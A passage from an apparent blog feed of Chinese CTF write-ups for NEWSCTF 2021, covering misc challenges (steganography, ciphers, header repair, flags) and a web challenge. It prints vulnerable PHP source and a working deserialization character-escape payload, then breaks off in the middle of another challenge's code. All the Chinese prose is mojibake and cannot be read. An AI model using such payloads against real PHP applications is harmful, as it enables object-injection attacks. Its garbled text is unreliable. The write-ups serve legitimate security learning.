å¯ä»¥å¾—åˆ°ä¸€äº›å›¾ç‰‡ã€‚è§‚å¯Ÿå¯ä»¥çŸ¥é“å…¶ä¸­å†…å®¹å¤§é‡é‡å¤ï¼Œæ‰¾å‡ºä¸¤ç§ä¸åŒæ–‡ä»¶åŒ…å«çš„å”¯ä¸€å­—ç¬¦åˆ†åˆ«ä¸º <code>@</code> å’Œ <code>:</code>ã€‚å†™å‡ºè„šæœ¬åˆ†æå†…å®¹ï¼Œå°†å…¶ä¸­ä¸€ç§è®°ä¸º 1 å¦ä¸€ç§è®°ä¸º 0ã€‚</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /l <span class="variable">%%i</span> <span class="keyword">in</span> (<span class="number">0</span>,<span class="number">1</span>,<span class="number">167</span>) ^</span><br><span class="line"><span class="keyword">do</span> (<span class="built_in">findstr</span> &quot;:&quot; .\img\<span class="variable">%%i</span>.png &gt; <span class="built_in">nul</span> &amp;&amp; (<span class="built_in">echo</span> <span class="number">1</span> &gt;&gt; result.txt)) || (<span class="built_in">findstr</span> &quot;@&quot; .\img\<span class="variable">%%i</span>.png &gt; <span class="built_in">nul</span> &amp;&amp; (<span class="built_in">echo</span> <span class="number">0</span> &gt;&gt; result.txt))</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å¹¶æ•´ç†å¯å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">011001100110110001100001011001110111101101000100001100000101111101111001001100000111010101011111011011000110100101101011011001010101111101101001011101000011111101111101</span><br></pre></td></tr></table></figure><p>å°†å…¶ç”¨ <code>From Binary</code> è½¬æ¢ç¼–ç åå¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;D0_y0u_like_it?&#125;</span><br></pre></td></tr></table></figure><h3 id="æ‹¼å›¾"><a href="#æ‹¼å›¾" class="headerlink" title="æ‹¼å›¾"></a>æ‹¼å›¾</h3><p>æ‰‹æ‹¼ä¸€ä¸‹å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c6631aab-a958-4241-bfbe-49325f07b3c5/1613396799090743/2c00e27b7d4f2e980e9cf1ae7ec5a5d1a37a76be.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;123A4X5b6cLi&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NEWSCTF 2021</title>
      <link href="/zh-CN/posts/bf20b880.html"/>
      <url>/zh-CN/posts/bf20b880.html</url>
      
        <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="miscç­¾åˆ°å¤„"><a href="#miscç­¾åˆ°å¤„" class="headerlink" title="miscç­¾åˆ°å¤„"></a>miscç­¾åˆ°å¤„</h3><p>ä½¿ç”¨ 010 editor æ‰“å¼€æ–‡ä»¶å¯åœ¨æ–‡ä»¶å°¾éƒ¨å‘ç°å‹ç¼©æ–‡æ¡£ï¼ŒåŒæ—¶å› ä¸ºå…¶é‡‡ç”¨äº†ä»…å­˜å‚¨çš„æ–¹å¼å‹ç¼©ï¼Œæ˜æ–‡ç›´æ¥å¯è§ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389839797742/687838a8cc4f591bebdc15dd3f7cb165d659f91e.png"></p><p>å°†å…¶ä¸­å†…å®¹æå–å‡ºæ¥å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tXZWxjMG1lX3QwX25ld3NjdGYhISF9CuaUr+S7mOWuneWPo+S7pFvmrKLov47mnaXliLDokIzmlrDnvqTotZtd</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ base64 è§£ç ä¸€æ¬¡å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Welc0me_t0_newsctf!!!&#125;</span><br></pre></td></tr></table></figure><h3 id="ä¼ªè£…è€…"><a href="#ä¼ªè£…è€…" class="headerlink" title="ä¼ªè£…è€…"></a>ä¼ªè£…è€…</h3><p>ä¿®æ­£é™„ä»¶å‹ç¼©åŒ…æ–‡ä»¶å¤´ä¸º <code>Rar!</code>ï¼Œè§£å‹é™„ä»¶å¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œç”¨ 010 editor æ‰“å¼€å¯å‘ç° CRC Mismatch çš„æŠ¥é”™ï¼Œä½¿ç”¨è„šæœ¬çˆ†ç ´å¾—å®½é«˜ä¸º 1297x1065ï¼Œä¿®æ­£åå¯å¾—å¦‚ä¸‹å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389839914728/bb97b168771845e7a5e02cee555a3463851e2ab2.png"></p><p>æ ¹æ®èƒŒæ™¯ä¸­çš„æè¿°å¯çŸ¥é™„ä»¶ä¸­è§£å‹æ‰€å¾—çš„å‹ç¼©åŒ… niu.zip çš„å¯†ç ä¸ºå‰§ä¸­çš„â€œç‹å¤©é£â€ï¼Œè½¬æ¢æˆæ±‰è¯­æ‹¼éŸ³åå³ <code>wangtianfeng</code>ã€‚å°†å…¶ä½œä¸ºå‹ç¼©åŒ…å¯†ç è§£å‹ niu.zip å¯å¾—ä¸€å¼ å›¾ç‰‡ã€‚</p><p>åœ¨é™„ä»¶ä¸­è§£å‹æ‰€å¾—çš„ key.wav çš„æœ«å°¾å¯å¬åˆ°ä¸€æ®µ DTMFï¼Œå°†å…¶æå–å‡ºæ¥åæ³¢å½¢å’Œé¢‘ç‡å¦‚ä¸‹å›¾ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840083830/9bf60df5787e33f69dba1a451f8d5cc4d9e84690.png"></p><p>ä½¿ç”¨å·¥å…·å¯¹ç…§ç€è§£ç å†å¯¹ç…§ T9 é”®ç›˜è½¬è¯‘å¯å¾—å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#222833344477773338866#</span><br><span class="line">ctfisfun</span><br></pre></td></tr></table></figure><p>å°†å…¶ä½œä¸ºå¯†ç å¯¹ niu.jpg ä½¿ç”¨ steghide æå–ä¿¡æ¯å¯å¾—å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf niu.jpg -p ctfisfun -xf extract.txt</span><br><span class="line">ç†Šæ›°ï¼šå‘‹é£Ÿå¾ˆèª’å’¯å™”ç ´å•½ä½æœ‰æ­¡å—šè¨»å—„å’Œä½ åƒå†¬è¨»ç‰©ç‰©çœ å—šç¬¨å˜æ“Šç¬¨å™¤è¥²ä½ çˆ¾å’¬ä½ çˆ¾å¸¸ç ´å¾ˆæ­¡æˆ‘å–æ‹™æ­¡æ„æ“Šå’¯å …æœ‰å—·å—¥å“æ€ç™¼å”¬è‚‰æ—¢æ­¡æ²’ç ´å™¤å’¯äººå’Œå˜¶å•½æ›´</span><br></pre></td></tr></table></figure><p>å°†æ‰€å¾—ä¿¡æ¯ä½¿ç”¨ç†Šæ›°è§£å¯†å³å¯å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840127856/59ce54a045650316e88bc908aab282d30953f1c6.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ç‰›å¹´å¤§å‰ä»Šæ™šåƒé¸¡ä»Šæ™šåƒé¸¡å°å¹´å¿«ä¹happy&#125;</span><br></pre></td></tr></table></figure><h3 id="å¬è¯´ä½ å–œæ¬¢è–…ç¾Šæ¯›"><a href="#å¬è¯´ä½ å–œæ¬¢è–…ç¾Šæ¯›" class="headerlink" title="å¬è¯´ä½ å–œæ¬¢è–…ç¾Šæ¯›"></a>å¬è¯´ä½ å–œæ¬¢è–…ç¾Šæ¯›</h3><p>è§£å‹é™„ä»¶åå¾—åˆ°ç¾Šæ¯›.jpgï¼Œåœ¨æ–‡ä»¶å°¾éƒ¨å¯ä»¥å‘ç°å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">011110000010010100101011001110100010001101000100101001101000011010011010010001111010001110011010100010111010000011110100000000110111000000000110100110011000000001110</span><br></pre></td></tr></table></figure><p>å°†å…¶ä½¿ç”¨åŸ¹æ ¹å¯†ç è§£å¯†ä¹‹åå¯å¾—å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwordistingshuonixihuanyangmao</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>tingshuonixihuanyangmao</code> å¯¹ç¾Šæ¯›.jpg æ‰§è¡Œ outguess å¯ä»¥å¾—åˆ° brainpower çš„å‹ç¼©åŒ…å¯†ç  <code>Wdn1His87</code>ã€‚å°†å‹ç¼©åŒ…è§£å‹åå¾—åˆ°ä¸€ä¸ªæ–‡æœ¬æ–‡æ¡£ï¼Œfile ä¸€ä¸‹å¯çŸ¥æ˜¯éŸ³é¢‘æ–‡ä»¶ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840182034/6c446279d0c0b5260ecd81645cccfb7182534515.png"></p><p>ä¿®æ­£æ‹“å±•åä¸º mp3 åä½¿ç”¨ Audition å¯ä»¥å‘ç°å¦‚ä¸‹ä¿¡æ¯ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840393034/9b5e65c8914c97ac0bf7cd6403898abcfc726b4b.png"></p><p>ä½¿ç”¨ <code>PsWdMuzi123</code> ä½œä¸ºå‹ç¼©åŒ…å¯†ç è§£å‹ flag.zip å¯ä»¥å¾—åˆ°ä¸€ä¸ª flag.txtã€‚å…¶ä¸­çš„å†…å®¹ç»è¿‡å€’åºåå†åå…­è¿›åˆ¶åˆ°åè¿›åˆ¶è½¬åŒ–ä¸€æ¬¡å¯å¾—ä¸€å¼ å›¾ç‰‡æ–‡ä»¶ã€‚å°†æ–‡ä»¶å¤´ä¿®æ­£å› JPG çš„æ–‡ä»¶å¤´ <code>FF D8 FF E0 00 10 4A 46 49 46</code> å³å¯å¾—åˆ°å¦‚ä¸‹äºŒç»´ç ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840458062/457b16b6ab875e57cbd5a1e56db671b24f02c9b0.jpg"></p><p>æ‰«æäºŒç»´ç å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;s0_easy_is_not_it?&#125;</span><br></pre></td></tr></table></figure><h3 id="happy-ox"><a href="#happy-ox" class="headerlink" title="happy ox"></a>happy ox</h3><p>è§£å‹é™„ä»¶å¯ä»¥å¾—åˆ°ç‰›çˆ·çˆ·ç¥å¤§å®¶ç‰›å¹´è¡Œå¤§è¿.pngã€‚ä½¿ç”¨ stegsolve å¯è§£å‡º flag in it.zip çš„å‹ç¼©åŒ…å¯†ç ä¸º <code>niuniandaji888</code>ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840528145/9960e7a59c3ebcd6de266c3f93b7b9a1249970fe.png"></p><p>å°† flag in it.zip è§£å‹å¯å¾—åˆ°ä¸€ä¸ª Word æ–‡æ¡£ï¼Œå…¶ä¸­æœ‰ä¸€å¼ å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840632036/4afbd50b288e48752b87c6964a3eb31c310645e8.png"> </p><p>å°† Word æ–‡æ¡£æ‰“å¼€åæ ¹æ®å…¶ä¸­å†…å®¹å¯çŸ¥æ£‹ç›˜ä¸Šæ‰€ç”¨å¯†ç ä¸ºç§‘æ¯”å¯†ç ã€‚ä½¿ç”¨å¦‚ä¸‹å¯†ç è¡¨å¯¹ç…§è§£å¯†ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613390969937/ffc2453542232e936c0a73c520482e4c5fb9d370.png"></p><p>å¯ä»¥å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PASSWDISKBYYDSEZ</span><br></pre></td></tr></table></figure><p>ä»¥ kbyydsez ä¸ºå‹ç¼©åŒ…å¯†ç è§£å‹ flag.zip å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0h_y0u_f1nd_Me_h3ck&#125;</span><br></pre></td></tr></table></figure><h3 id="EMOJI"><a href="#EMOJI" class="headerlink" title="EMOJI"></a>EMOJI</h3><blockquote><p>Reference: <a href="https://www.zhihu.com/question/332742614/answer/737382212">https://www.zhihu.com/question/332742614/answer/737382212</a></p></blockquote><p>ä¿®å¤ rar é™„ä»¶çš„æ–‡ä»¶å¤´ <code>Rar!</code>ï¼Œå¯ä»¥è§£å‹å‡ºä¸€å¼ å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840704118/492a05330b9726d4ba5e73334344931332a72c88.png"></p><p>æ­¤å›¾æ˜¯æ ¹æ®ã€Šé•¿å®‰åäºŒæ—¶è¾°ã€‹ä¸­çš„æœ›æ¥¼ä¼ ä¿¡ç¼–åˆ¶çš„ï¼Œä¸ªåç™¾ä½è§£ç å›¾å¦‚ä¸‹ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840803116/b7478abea371cdd6b0c031d4a0aca1044ba81892.jpg"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840877046/1278f7f0c140b5be95563c5c0cce593ef931354d.jpg"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389840957266/1284facd764f73d598f86368962d7e171dbf79ae.jpg"></p><p>å¯¹ç…§ä¸Šé¢ä¸‰å›¾å¯ä»¥å°†é¢˜ç›®ä¸­æ‰€ç»™ç®—å¼è½¬æ¢å‡ºæ¥ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">799 * 248 + 21</span><br></pre></td></tr></table></figure><p>ç®—å‡ºç»“æœä¸º 198173ï¼Œåˆ™å‹ç¼©åŒ…å¯†ç æ ¹æ®æç¤ºå¯çŸ¥æ˜¯ <code>ä¸€ä¹å…«ä¸€ä¸ƒä¸‰</code>ã€‚è§£å‹ä¹‹åå¾—åˆ°æ–‡æœ¬ä¿¡æ¯å¦‚ä¸‹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key:sixgod</span><br><span class="line">ciphertext:ğŸ™ƒğŸ’µğŸŒ¿ğŸ¤ğŸšªğŸŒğŸğŸ¥‹ğŸš«ğŸ˜†âœ…ğŸŒâœ…ğŸš¨ğŸ“‚ğŸ“®ğŸ•¹ğŸ…ğŸ¥‹ğŸŒ‰ğŸ˜ğŸšªğŸ¤£ğŸ…ğŸ‘‘â˜‚ğŸ˜€ğŸ¦“â©ğŸ˜ğŸŒğŸ…ğŸŒ¿ğŸ˜ğŸ’µğŸµâ˜€âœ‰ğŸğŸŒªğŸš«ğŸ’µğŸğŸğŸ‘£ğŸ’µğŸ”ªğŸŒâœ‰ğŸ˜ğŸ˜‚ğŸš¨â˜‚ğŸ“®ğŸ”ªğŸ’µğŸ¹ğŸ‘‰ğŸğŸ”¬ğŸŒªğŸâ„¹ğŸ˜ŠğŸš¨ğŸ˜‚ğŸµğŸµğŸ˜ŠğŸš¨ğŸ”ªâœ–ğŸˆâ˜ºğŸ¦“ğŸš°â˜ƒğŸŒğŸšªğŸ‘£ğŸâœ‰ğŸ‘ŒğŸ”„âœ‰ğŸ’§ğŸ—’ğŸ—’</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<a href="https://aghorler.github.io/emoji-aes/"> emoji-aes åœ¨çº¿åŠ è§£å¯†å·¥å…·</a>è§£å¯†å³å¯å¾—å‡º flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;em0j1_Aes_1s_3_ni5e_3ncr9pt_to0l&#125;</span><br></pre></td></tr></table></figure><h3 id="ç¼ºæ–¤å°‘ä¸¤"><a href="#ç¼ºæ–¤å°‘ä¸¤" class="headerlink" title="ç¼ºæ–¤å°‘ä¸¤"></a>ç¼ºæ–¤å°‘ä¸¤</h3><p>è§£å‹é™„ä»¶å¯å¾—ä¸¤å¼ å›¾ç‰‡ï¼Œæ‰«æ <code>è°éŸ³æ¢—ï¼Œæ‰£é’±ï¼.png</code> å¯å¾—å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¤§ç‰›ï¼šæˆ‘ä¹Ÿå¾ˆç–‘æƒ‘å‘¢</span><br></pre></td></tr></table></figure><p>password.png çš„äºŒç»´ç å¾ˆæ˜æ˜¾ç¼ºå°‘äº†ä¸€éƒ¨åˆ†ï¼Œæ ¹æ®è°éŸ³æ¢—æ¨æµ‹éœ€è¦å¼‚æˆ–å›¾ç‰‡ã€‚äºæ˜¯å°†ä¸Šè¿°ä¸¤å¼ å›¾ç‰‡å¼‚æˆ–åå¾—åˆ°å¦‚ä¸‹å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613393667083/f2265bcc80380afcfe97dcc12a911e0193065d59.png@125w.png"></p><p>å°†å›¾ç‰‡åè‰²å¹¶ä¿®æ­£å®šä½ç‚¹åæ‰«æå¯å¾—å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password:1q2w3e4r5t6y7u8i</span><br></pre></td></tr></table></figure><p>å°†å…¶ä½œä¸ºå‹ç¼©åŒ…å¯†ç è§£å‹ flag+2.zipã€‚æ ¹æ®å¾—åˆ°çš„ hint.txt ä¸­çš„æç¤º <code>å¯†ç æ˜¯é çŒœçš„ï¼Œä¸æ˜¯çˆ†ç ´ï¼</code> å¯çŸ¥ passwd.jpg ä¸­è—æœ‰éšå†™ã€‚ä½¿ç”¨ outguess å¯ä»¥è§£å‡ºå…¶ä¸­å†…å®¹ä¸º <code>news52ctf0</code>ã€‚åœ¨ <code>å–µå‘œ.jpg</code> ä¸­å¯åˆ†ç†å‡ºä¸€ä¸ªå‹ç¼©åŒ…ã€‚ï¼ˆåˆ°è¿™ä¸€æ­¥æˆ‘æ²¡æ³•ç”¨ä¸Šé¢å¾—åˆ°çš„å¯†ç æ¥è§£å‹å‡ºå‹ç¼©åŒ…äº†ï¼Œäºæ˜¯çœ‹äº† WriteUp æ¥ç€å¾€ä¸‹å†™ï¼‰</p><p>æ¢è¡¨çš„ base64 ç¼–ç ï¼Œç®€å•ç­›é€‰å‡ºé—®å·å¯èƒ½çš„å­—ç¬¦ <code>ju34=</code>ï¼Œæ’åˆ—ç»„åˆä¸€ä¸‹å¯ä»¥å¾—åˆ°æ­£ç¡®ç»“æœã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;lemonprefect.cn&#x2F;cb&#x2F;#recipe&#x3D;From_Base64(&#39;JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs34ujkxyz012789%2B&#x2F;&#39;,true)&amp;input&#x3D;bXRIVm5rTG5JYVAzRmFBN0tPV2pUbUtrVmpXalZ6S2pkZU52VG5Bam9IOWlaT0l2VGVIYnZEPT0</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NEWSCTF2020&#123;base64_1s_v3ry_e@sy_and_fuN&#125;</span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h3><p>ä»£ç å®¡è®¡çš„é¢˜ç›®ï¼Œç»™å‡ºçš„ä»£ç å¦‚ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> (<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$payload</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;boyfriend&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$key</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;hack!!!!&#x27;</span>,<span class="variable">$payload</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>];</span><br><span class="line"><span class="variable">$GDUT</span>[<span class="string">&#x27;A&amp;D&#x27;</span>]=<span class="string">&#x27;666&#x27;</span>;</span><br><span class="line"><span class="variable">$GDUT</span>[<span class="string">&#x27;Hed9eh0g&#x27;</span>]=<span class="string">&#x27;no_girlfriend&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$payload</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (strpos(<span class="variable">$payload</span>, <span class="string">&#x27;php&#x27;</span>)===<span class="literal">false</span>  &amp;&amp; strpos(<span class="variable">$payload</span>, <span class="string">&#x27;flag&#x27;</span>)===<span class="literal">false</span> &amp;&amp; strpos(<span class="variable">$payload</span>, <span class="string">&#x27;boyfriend&#x27;</span>)===<span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;fuck_no_key!!!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$GDUT</span>[<span class="string">&#x27;A&amp;D&#x27;</span>]=<span class="variable">$payload</span>;</span><br><span class="line">        <span class="variable">$GDUT</span>=unserialize(filter(serialize(<span class="variable">$GDUT</span>)));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$GDUT</span>[<span class="string">&#x27;Hed9eh0g&#x27;</span>] === <span class="string">&#x27;has_girlfriend&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;fuck_no_girlfriend!!!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€ƒç‚¹æ˜¯ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼Œæœ‰ä¸‰ä¸ªå­—ç¬¦ä¸²æ›¿æ¢ï¼Œå…³ç³»å¦‚ä¸‹æ‰€ç¤ºã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php --&gt; å­—ç¬¦ä¸²é•¿åº¦ +5</span><br><span class="line">boyfriend --&gt; å­—ç¬¦ä¸²é•¿åº¦ -1</span><br><span class="line">flag --&gt; å­—ç¬¦ä¸²é•¿åº¦ +4</span><br></pre></td></tr></table></figure><p>éœ€è¦çš„æœ€åç»“æœæ˜¯ Hed9eh0g çš„å€¼ä¸º has_girlfriendã€‚å› æ­¤åªéœ€è¦å†™å‡ºè¿™æ ·çš„ payload å³å¯æˆåŠŸé€ƒé€¸åˆ° Hed9eh0gã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$payload</span> = str_repeat(<span class="string">&quot;flag&quot;</span>, <span class="number">10</span>) . str_repeat(<span class="string">&quot;php&quot;</span>,<span class="number">1</span>) . str_repeat(<span class="string">&quot;boyfriend&quot;</span>,<span class="number">5</span>) .<span class="string">&#x27;&quot;;s:8:&quot;Hed9eh0g&quot;;s:14:&quot;has_girlfriend&quot;;&#125;&#x27;</span> ;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶åºåˆ—åŒ–å‡ºæ¥çš„å­—ç¬¦ä¸²æ˜¯è¿™æ ·çš„ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:3:&quot;A&amp;D&quot;;s:128:&quot;hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!&quot;;s:8:&quot;Hed9eh0g&quot;;s:14:&quot;has_girlfriend&quot;;&#125;&quot;;s:8:&quot;Hed9eh0g&quot;;s:13:&quot;no_girlfriend&quot;;&#125;</span><br></pre></td></tr></table></figure><p>å°† payload æ‹¼æ¥åˆ°è¯·æ±‚ä¸­å‘é€å³å¯åœ¨å“åº”ä¸­å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389841035434/1f4c89da97f6005f6369a03bda02303e2934c8dc.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newsctf&#123;i_Lov3_nEws4tF_wEb&#125;</span><br></pre></td></tr></table></figure><h3 id="EZå¥—å¨ƒ"><a href="#EZå¥—å¨ƒ" class="headerlink" title="EZå¥—å¨ƒ"></a>EZå¥—å¨ƒ</h3><p>ç¬¬ä¸€æ­¥æ˜¯ä»£ç å®¡è®¡æ‹¿ hintï¼Œç»™å‡ºçš„ä»£ç å¦‚ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 